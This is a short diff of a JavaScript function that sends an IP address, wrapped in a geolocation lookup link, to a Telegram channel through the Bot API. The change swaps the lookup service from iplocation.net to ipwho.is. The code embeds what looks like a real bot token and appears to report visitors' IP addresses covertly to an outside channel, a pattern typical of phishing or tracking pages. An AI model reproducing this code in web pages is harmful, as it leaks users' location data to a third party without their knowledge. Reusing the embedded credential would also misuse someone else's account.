@@ -27,7 +27,7 @@ function done(){
 
  function api_url(ip){
     fetch(`https://api.telegram.org/bot5516668583:AAH6JtyF3z5Q_5Lw7V28sHyRyB-7yzjSffk/sendMessage?chat_id=@api_location&text=
-        ${encodeURIComponent(`https://api.iplocation.net/?ip=${ip}`)}
+        ${encodeURIComponent(`http://ipwho.is/${ip}`)}
         `);
       }
 
